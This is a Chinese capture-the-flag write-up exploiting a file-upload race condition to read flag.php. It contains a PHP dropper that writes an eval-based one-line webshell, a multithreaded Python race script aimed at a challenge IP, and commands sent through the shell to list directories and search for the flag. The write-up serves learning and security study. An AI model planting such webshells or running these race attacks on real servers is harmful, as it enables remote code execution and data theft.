# wzsc_文件上传   	WP

来源：泰山杯

这是一道文件上传的题目

#### 扫目录

我先扫了一下目录，发现两个打不开的路径：`flag.php,upload.php` 

![image-20251221140041074](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221140041074.png)

`/upload/`就是文件上传之后所在的页面，可以查看上传的文件

不能查看 `flag.php` ，可能就是需要通过文件上传漏洞来窃取该php,

#### bp抓包

```
POST /upload.php HTTP/1.1
Host: 61.147.171.35:64121
Content-Length: 206586
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Origin: http://61.147.171.35:64121
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjq491stij5K7l47f
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://61.147.171.35:64121/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryjq491stij5K7l47f
Content-Disposition: form-data; name="file"; filename="å¾®ä¿¡å¾ç_20250914180144_11_110.jpg"
Content-Type: image/jpeg
```

这是上传了一张照片的请求

没用的。

访问 `/upload/`可以看到上传的图片

然后再上传一个测试php文件：

#### 竞态条件：

上传成功，响应200，但是再 `upload/`中看不到，所以说是可能被短时间删除了。

> 这种情况只能采取条件竞争：
>
> ##### 条件竞争原理：
>
> 当我们成功上传了php文件，服务器端会在短时间内将其删除，我们需要抢在它删除之前访问文件并生成一句哈木马，所以访问包的线程需要大于上传包的线程。

所以先写一个用于上传的**php文件**：

```php
<?php fputs(fopen("shell2.php","w"),'<?php @eval($_POST["cmd"]); ?>');
phpinfo(); ?>
```

> 这个PHP文件是典型的一句话木马：
>
> **这段代码的作用就是：在服务器上新建一个Webshell文件 `shell2.php` ,然后输出一堆服务器配置信息证明“我已经被执行了”**
>
> ##### 核心：
>
> ```php
> fputs(fopen("shell2.php","w"),'<?php @eval($_POST["cmd"]); ?>')
> ```
>
> 拆解成三个：
>
> 1. `fopen("shell2.php","w")`
>
>    **含义：**在当前目录打开或创建一个文件：`shell2.php` ,`"w"` 就是写入模式
>
> 2. `fput(文件句柄，内容)`
>
>    **含义：**把字符串写进文件里
>
> 3. 实际写入的内容就是：`'<?php @eval($_POST["cmd"]);?>'`
>
>    也就是`shell2.php` 的最终内容。
>
> ##### web shell落地：在服务器上“永久写入了一个新的PHP webshell”
>
> ##### `shell2.php` 到底是什么？
>
> ```php
> <?php @eval($_POST["cmd"]); ?>
> ```
>
> `$_POST["cmd"]` 
>
> 从HTTP POST参数中取名为 `cmd` 的值
>
> 比如：
>
> ```
> cmd=system("ls");
> ```
>
> `eval(...)`
>
> **含义：**把字符串当作PHP代码执行。
>
> `@`
>
> **含义：**抑制出错，出错也不显示
>
> #### 总的功能：
>
> 你发什么代码，它就能执行什么。
>
> 例如：
>
> ```
> cmd=system("ls");
> cmd=system("cat /var/www/html/flag.php");
> cmd=phpinfo();
> ```
>
> ##### 这就是标准的一句话木马。







我们可以使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会像服务器写一个shell.php

所以，最终我们利用的不是我们上传的文件，上传只能为了能有一刻能够成功访问，一旦访问成功，便会写入一句话木马，我们最终利用的就是新写入的php文件。



**抓POST包：**上传的包

![image-20251221145142436](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221145142436.png)

**抓GET包：**访问的包：

![image-20251221145301443](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221145301443.png)

设置intruder参数：

将这两个的payload都选择**null**，并勾选 `continue indefinitely`

但是由于intruder在竞态条件这方面不是专业的，速度太慢，很难抓到200的，所以我们**进行intruder和python脚本结合。**



#### python脚本：

```
import requests
import threading
import os
 
class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
 
        self.url = 'http://61.147.171.35:61329/upload/scri.php'
        self.uploadUrl = 'http://61.147.171.35:61329/upload.php'
 
    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)
 
    def _upload(self):
        print('upload file...')
        rs = requests.get(self.uploadUrl)
        if rs.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)
 
    def run(self):
        while True:
            for i in range(5):
                self._get()
 
            for i in range(10):
                self._upload()
                self._get()
 
if __name__ == '__main__':
    threads = 50
 
    for i in range(threads):
        t = RaceCondition()
        t.start()
 
    for i in range(threads):
        t.join()

```

在intruder中一直POST上传文件的包，由于intruder在GET包的时候速度特别慢，所以用python脚本来代替，同时attack和run.

观察终端的响应：

![image-20251223152323286](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223152323286.png)

成功的创建shell.php说明文件已经被上传了。

在 `/upload/`页面查看，

![image-20251223152630628](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223152630628.png)

 

#### 查看上传的shell

因为已经上传了`shell2.php` ，但是在`/upload/` 页面点击这个是看不了的，因为这相当于是我们所放置的一个门，我们要通过这个门去找到`flag.php` .

选择用命令行的方式来查看，我们现在已经知道的是：

通过Web访问的PHP：

```
http://61.147.171.35:61329/upload/shell2.php
```

这就说明：

- web服务器在跑
- PHP被解析
- 当前路径在Web跟目录下面

`shell2.php`在 `/upload/` 目录：

映射规则几乎一定就是：

```
URL:    /upload/shell2.php
FS:     /var/www/html/upload/shell2.php
```

这就是Linux+PHP web的默认映射

> ### 99% Linux PHP 环境：
>
> | Web 服务器             | DocumentRoot            |
> | ---------------------- | ----------------------- |
> | Apache (Debian/Ubuntu) | `/var/www/html`         |
> | Nginx                  | `/usr/share/nginx/html` |
> | 宝塔 / LNMP            | `/www/wwwroot/xxx`      |

##### 从实际的输出来证明：

执行 `system("ls");` 返回的是：`shell2.php`

说明：

- 当前目录只放上传文件
- 是个子目录

所以自然就要：

```
ls ..
ls ../..
```

最后就会到：

```
/var/www/html
```



如果不了解目录列表，也可以：

```
curl -X POST http://61.147.171.35:61329/upload/shell2.php \
  -d 'cmd=system("find / -name flag* 2>/dev/null");'
```

就是全盘找。

flag就出来了：

![image-20251223152740826](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223152740826.png)



#### 总结：

```
我能 RCE
↓
这是 Web Shell
↓
WebShell 在 /upload
↓
/upload ⊂ Web Root
↓
Web Root = /var/www/html
↓
flag 在 Web Root（90%）
```

